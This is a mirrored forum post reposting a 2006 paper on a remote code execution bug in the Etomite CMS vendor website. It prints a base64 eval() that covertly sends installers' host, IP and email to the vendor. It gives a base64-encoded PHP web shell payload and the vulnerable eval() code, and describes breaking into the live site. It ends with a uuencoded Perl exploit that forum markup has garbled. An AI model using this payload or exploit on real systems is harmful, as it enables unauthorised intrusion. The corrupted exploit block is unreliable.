<!DOCTYPE html>
<html lang="en-US">
  
<!-- Mirrored from forum.moparisthebest.com/t/blind-exicution-attack/13600 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Aug 2019 08:25:46 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Blind Exicution Attack - General Discussion - moparisthebest.com</title>
    <meta name="description" content="The Etomite.org Blind Execution Attack 

Copyright © 2006 cijfer  All rights reserved. 

Table of Contents 

1 About this paper 2 My curiosity 3 The vulnerable code 4 Greets 

1 About this paper 

The following paper was&amp;hellip;">
    <meta name="generator" content="Discourse 2.3.2 - https://github.com/discourse/discourse version c587df7e2a03c2962f4c8cefd6f03969bb87d525">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/1/1f0dc167bcf798bdbd70b03bf0fd1bc836e54e1a_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff_2_180x180.png">
<meta name="theme-color" content="#0088cc">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="13600.html" />
<script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","url":"https://forum.moparisthebest.com","potentialAction":{"@type":"SearchAction","target":"https://forum.moparisthebest.com/search?q={search_term_string}","query-input":"required name=search_term_string"}}</script>
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="moparisthebest.com Search">

      <link href="../../stylesheets/desktop_1_ec9f75e3d0b2a904642ce53663991837b70cda3334fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop" data-theme-id="2"/>
      <link href="../../stylesheets/desktop_theme_2_6707e7ee46ac9f2f0510c29ddd10e8f6ce21c1ae34fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="2"/>
    
    
      <link rel="alternate" type="application/rss+xml" title="RSS feed of &#39;Blind Exicution Attack&#39;" href="13600.rss" />
  <meta property="og:site_name" content="moparisthebest.com" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:url" content="https://forum.moparisthebest.com/t/blind-exicution-attack/13600" />
<meta name="twitter:url" content="https://forum.moparisthebest.com/t/blind-exicution-attack/13600" />
<meta property="og:title" content="Blind Exicution Attack" />
<meta name="twitter:title" content="Blind Exicution Attack" />
<meta property="og:description" content="The Etomite.org Blind Execution Attack  Copyright © 2006 cijfer &lt;cijfer@netti!fi&gt;  All rights reserved.  Table of Contents  1 About this paper  2 My curiosity  3 The vulnerable code  4 Greets  1 About this paper  The following paper was written to allow curious readers to  fully understand my mystery pertaining to a random discovery  within Etomite.org and the CMS software they distribute. The  reason that i wrote this, was because of the fact that the  bug itself was not within the CMS, but fou..." />
<meta name="twitter:description" content="The Etomite.org Blind Execution Attack  Copyright © 2006 cijfer &lt;cijfer@netti!fi&gt;  All rights reserved.  Table of Contents  1 About this paper  2 My curiosity  3 The vulnerable code  4 Greets  1 About this paper  The following paper was written to allow curious readers to  fully understand my mystery pertaining to a random discovery  within Etomite.org and the CMS software they distribute. The  reason that i wrote this, was because of the fact that the  bug itself was not within the CMS, but fou..." />
<meta property="article:published_time" content="2006-09-09T19:27:11+00:00" />
<meta property="og:ignore_canonical" content="true" />



    
  </head>
  <body class="crawler">
    
    <header>
      <a href="../../index.html">
          <img src="../../uploads/default/original/2X/3/37bba8fb3bd06c372ab54fa72ec38bf9f8f40b37.gif" alt="moparisthebest.com" id="site-logo" style="max-width: 150px;">
      </a>
    </header>
    <div id="main-outlet" class="wrap">
      <h1 class="crawler-topic-title">
  <a href="13600.html">Blind Exicution Attack</a>
</h1>

<div id='breadcrumbs'>
    <div id="breadcrumb-0" itemscope itemtype="http://data-vocabulary.org/Breadcrumb"
>
      <a href="../../c/general-discussion.html" itemprop="url" class='badge-wrapper bullet'>
        <span class="badge-category-bg"></span>
        <span itemprop="title" class='category-title'>General Discussion</span>
      </a>
    </div>
</div>





  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/jonckr.html'><span itemprop='name'>jonckr</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2006-09-09T19:27:11Z'>
            <time itemprop='dateModified' datetime='2016-07-29T21:52:22Z' class='post-time'>
              July 29, 2016,  9:52pm
            </time>
        <span itemprop='position'>#1</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>The <a href="http://etomite.org/" rel="nofollow noopener">Etomite.org</a> Blind Execution Attack</p>
<p>Copyright © 2006 cijfer &lt;cijfer@netti!fi&gt;<br>
All rights reserved.</p>
<p>Table of Contents</p>
<p>1 About this paper<br>
2 My curiosity<br>
3 The vulnerable code<br>
4 Greets</p>
<p>1 About this paper</p>
<p>The following paper was written to allow curious readers to<br>
fully understand my mystery pertaining to a random discovery<br>
within <a href="http://etomite.org/" rel="nofollow noopener">Etomite.org</a> and the CMS software they distribute. The<br>
reason that i wrote this, was because of the fact that the<br>
bug itself was not within the CMS, but found randomly in<br>
the vendor website through their modified version of the<br>
CMS.</p>
<p>2 My curiosity</p>
<p>My purpose was just to look for vulnerabilities. It is at<br>
the moment January 10 2006. I had to choose which CMS i<br>
wanted to audit. At random, i chose Etomite CMS. Unlike<br>
the other CMS sytems, Etomite’s was quite confusing. Not<br>
the PHP itself, but the fact that its functions were within<br>
functions within functions, and their use of a cache system.<br>
Not to mention a large amount of base64 encoded functions and<br>
such.</p>
<p>I was just looking through various files, until i stumbled<br>
on a file containing a small amount of base64 code. It is<br>
my instinct to of course decode the base64 using a simple<br>
online base64 decoder.</p>
<p>File: ‘manager/includes/settings.inc.php’</p>
<p>++ Base64 Encoded ++<br>
eval(base64_decode(“ZWNobyAiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFz<br>
Y3JpcHQnPnRvcC5kb2N1bWVudC5sb2NhdGlvbi5ocmVmPSdodHRwOi8vd3d3<br>
LmV0b21pdGUub3JnL2xpY2Vuc2U/cz0iLmJhc2U2NF9lbmNvZGUoJF9TRVJW<br>
RVJbJ1NFUlZFUl9OQU1FJ10pLiImaT0iLmJhc2U2NF9lbmNvZGUoJF9TRVNT<br>
SU9OWydpcCddKS4iJmU9Ii5iYXNlNjRfZW5jb2RlKCRfU0VTU0lPTlsnZW1h<br>
aWwnXSkuIiZjczE9Ii4kX1NFU1NJT05bJ3ZhbGlkJ10uIiZjczI9Ii4kX1NF<br>
U1NJT05bJ3VzZXInXS4iJmNzMz0iLmJhc2U2NF9lbmNvZGUoJEdMT0JBTFNb<br>
ImZ1bGxfYXBwbmFtZSJdKS4iJzs8L3NjcmlwdD4iOw==”));</p>
<p>++ Base64 Decoded ++<br>
echo "";</p>
<p>This led me to believe that the CMS basically logged their<br>
downloaders/users for their servers hostname, the persons IP<br>
address, email address, username, and name/version of the CMS<br>
they were using.</p>
<p>As a joke, i decided to visit the page with my own values in<br>
the variables. I set the ‘s’ variable with the following<br>
to attempt to create an SQL error if possible:</p>
<p>’ OR ‘a’=‘a’</p>
<p>The other variables, i had just set their values to 1. After<br>
setting them and viewing the page, i realized that i had<br>
forgotten to base64 encode my input. To further advance my<br>
joke, i encoded the following in base64:</p>
<p>++ Base64 Decoded ++</p>
&lt;?passthru($_GET[cmd]);die();?&gt;
<p>++ Base64 Encoded ++<br>
PD9wYXNzdGhydSgkX0dFVFtjbWRdKTtkaWUoKTs/Pg==</p>
<p>After filling in every variable except ‘s’ with my base64<br>
encoded PHP code, to my surprise, i had encountered the<br>
following error on the page:</p>
<p>PHP error debug<br>
Error: passthru(): Cannot execute a blank command<br>
Error type/ Nr.: Warning - 2<br>
File: /home/xxx/public_html/index.php(414) : eval()'d code<br>
Line: 22</p>
<p>Mitä vittua??? Did it just say what i think it just said…<br>
Indeed, it apparently tried to execute a command using my<br>
encoded PHP code. But how? Is this even a bug within the CMS?<br>
I kept asking myself questions and then decided to write a<br>
small exploit in Perl against this bug. It was to be used<br>
only against the CMS website (PoC will be included at the end<br>
of this paper).</p>
<p>After getting inside, i tried to just look through all their<br>
PHP files to see if i could figure out <em>why</em> it did what it<br>
did. So i looked.</p>
<p>3 The vulnerable code</p>
<p>After looking at it for around 45 minutes, i began getting a<br>
bit annoyed. I had to traceback function after function and<br>
then finally came across one function which had something<br>
interesting:</p>
<p>function outputContent() {<br>
…<br>
// Check to see if document content contains PHP tags.<br>
// PHP tag support contributed by SniperX<br>
if( (preg_match("/(&lt;?php|&lt;?)(.*?)?&gt;/", $documentOutput))<br>
&amp;&amp; ($type == “text/html”) &amp;&amp; ($this-&gt;allow_embedded_php) )<br>
{<br>
$documentOutput = ‘?’.’&gt;’ . $documentOutput . ‘&lt;’.’?php ';<br>
// Parse the PHP tags.<br>
eval($documentOutput);<br>
}<br>
…</p>
<p>Do you see it? Through all of the functions, it came down to<br>
the value of $documentOutput (which was the base64 encoded<br>
data i passed through each variable). These variables were<br>
apparently also sent through a MySQL query, which i figured<br>
out after decoding more base64 data. This is why i got the<br>
MySQL errors. But, in order to trigger the command execution,<br>
i had to create an error. This led me back and forth until i<br>
realized that it was ‘outputContent’ which was the problem.</p>
<p>Any person fluent in PHP knows of the eval() function. It<br>
basically evaluates PHP code. In other words, doing the<br>
following will execute the PHP code as if they were between<br>
the angled brackets (&lt;? and ?&gt;)</p>
<p>eval(“passthru(‘id’);”);</p>
<p>This led me to believe that it was the eval() call in the<br>
outputContent function that had made my code get executed. I<br>
did not realize that it was the problem, because of the fact<br>
i had used angled brackets in my query. I overlooked the code<br>
where outputContent parses out the angled brackets. I thank<br>
my friend ReZEN for showing that out for me. I was focused on<br>
eval(), haha.</p>
<p>Before i conclude this paper, i have not concluded whether or<br>
not the actual distributable CMS is vulnerable to this. It<br>
may or may not be, but i will let other people do that work<br>
or maybe i will do that in the distant future.[br][size=1]Posted at: September 09, 2006, 09:26:02 AM[/size][hr]4 Greets</p>
<p>ReZEN (<a href="http://www.xorcrew.net/" rel="nofollow noopener">http://www.xorcrew.net</a>)<br>
for pointing out the PHP code which parsed out the angled<br>
brackets, which led to the conclusion of why the PHP code was<br>
able to get parsed by eval().</p>
<p>begin 644 cijfer-kikkeli.pl<br>
M(R$O=7-R+V)I;B]P97)L"B,<em>(R!%=&amp;]M:71E+F]R9R!%;&amp;ET92!%&gt;’!L;VETz<br>
M"B,</em>(R!#;W!Y&lt;FEG:‘0@<em>&amp;,I(#(P,<span class="hashtag">#8</span>@8VEJ9F5R(<span class="hashtag">#QC:6IF97</span>) ;F5T=&amp;DNy<br>
M9FD^"B,<span class="mention">@06QL</span>(’)I9VAT&lt;R!R97-E&lt;G9E9"X</em>(PHC($5T;VUI=&amp;4N;W)G(’-Tx<br>
M:6YK&lt;RP@86YD(’-O(&amp;1O97,@=&amp;AE:7(@;&amp;%M92!<span class="hashtag">#35</span>,N"B,<em>(R D260Z(&amp;-Iw<br>
M:F9E&lt;BUK:6MK96QI+G!L+'8@,“XQ(#(P,<span class="hashtag">#8O</span>,#$O,3 @,# Z,<span class="hashtag">#DZ-</span>#@<span class="mention">@8VEJv</span><br>
M9F5R($5X&lt;”!C:6IF97(@) H</em>=7-E($Q74#HZ57-E&lt;D%G96YT.PIU&lt;V4@55))u<br>
M.CI%&lt;V-A&lt;&amp;4<a>"G5S92!'971O&lt;'0Z.DQO;F&lt;[“G5S92!497)M.CI!3E-)0V]Lt<br>
M;W([”@HD:&amp;]S=" </a>H=‘1P.BO=W=W+F5T;VUI=&amp;4N;W)G(CL*"G=H:6QEs<br>
M*"D*&gt;PH)&lt;’)I;G0@8V]L;W(H(F=R965N(BDL(")C:6IF97)&lt;)" B+"!C;VQOr<br>
M&lt;B@B&lt;F5S970B<em>3L</em>"6-H;VUP*“1C;VUM86YD(<span class="hashtag">#T</span>@/%-41$E./BD[”@EE&gt;&amp;ETq<br>
M(‘5N;&amp;5S&lt;R D8V]M;6%N9#L*"29E&gt;’!L;VET*“1C;VUM86YD<em>3L</em>?0H*&lt;W5Bp<br>
M(&amp;5X&lt;&amp;QO:70*&gt;PH))&amp;-I:CU,5U Z.E5S97)!9V5N=“T^;F5W*“D@;W(<span class="mention">@9</span>&amp;EEo<br>
M.PH))&amp;-I:BT^86=E;G0H(DUO&gt;FEL;&amp;$O-2XP(“A8,3$[(%4[($QI;G5X(&amp;DVn<br>
M.<span class="hashtag">#8</span>[(&amp;9I+49).R!R=CHR+C I($=E8VMO+S(P,<span class="hashtag">#8P</span>,3 Q(BD[”@DD8VEJ+3YPm<br>
M&lt;F]X&gt;2@B:'1T&lt;”(L(”)H='1P.BO(BXD='5N;F5L+B(O(BD@=6YL97-S(”$Dl<br>
M=‘5N;F5L.PH*"21S=’)I;F&lt;@(<span class="hashtag">#T</span>@(F5C:&amp;E,C!?8VEJ9F5R7R4S0B(<a>"@DDk<br>
M&lt;W1R:6YG("X</a>)’-T&lt;FEN9R N/2 cool.gif3-“j<br>
M96-H;R4R,%]C:6IF97)?(CL*”<span class="mention">@DD</span>;W5T/21C:6HM/F=E="<span class="mention">@D</span>:&amp;]S=“XB+VQIi<br>
M8V5N&lt;V4_&lt;SU*&gt;4)056E!;EE38SE*,D5N)FD],29E/3$F8W,Q/3$F8W,R/3$Fh<br>
M8W,S/5!$.7=96$YZ9$=H&gt;6139VM8,&amp;1&amp;5D9T:F%7&lt;&amp;1+5’1K85=5;TM4&lt;R]0g<br>
M9ST])F-I:CTB+B1S=’)I;F&lt;I.PH*“6EF*“1O=70M/FES7W-U8V-E&lt;W,I”<span class="mention">@E</span>[f<br>
M”<span class="mention">@D</span>)0&amp;-I:CUS&lt;&amp;QI=”<span class="mention">@B7V-I</span>:F9E&lt;EB+"1O=70M/F-O;G1E;G0I.PH)"7!Re<br>
&lt;:6YT(’-U8G-T&lt;BA 8VEJ6S%=+#$I.PH)?0I]"G0Md<br>
c<br>
end[quote]<br>
i do not take credit for this tut</p>
<p>taken from:<a href="http://www.blitzmodz.com/forums/index.php?showtopic=2641" rel="nofollow noopener">http://www.blitzmodz.com/forums/index.php?showtopic=2641</a></p>
      </div>

      <meta itemprop='headline' content='Blind Exicution Attack'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>

          <div class='crawler-linkback-list' itemscope itemtype='http://schema.org/ItemList'>
          </div>

  </div>






    </div>
    <footer class="container wrap">
      <nav class='crawler-nav' itemscope itemtype='http://schema.org/SiteNavigationElement'>
        <ul>
        <li itemprop="name"><a href='../../index.html' itemprop="url">Home </a></li>
        <li itemprop="name"><a href='../../categories.html' itemprop="url">Categories </a></li>
        <li itemprop="name"><a href='../../guidelines.html' itemprop="url">FAQ/Guidelines </a></li>
        <li itemprop="name"><a href='../../tos.html' itemprop="url">Terms of Service </a></li>
        <li itemprop="name"><a href='../../privacy.html' itemprop="url">Privacy Policy </a></li>
        </ul>
      </nav>
      <p class='powered-by-link'>Powered by <a href="https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
    </footer>
    
  </body>
  

<!-- Mirrored from forum.moparisthebest.com/t/blind-exicution-attack/13600 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Aug 2019 08:25:47 GMT -->
</html>
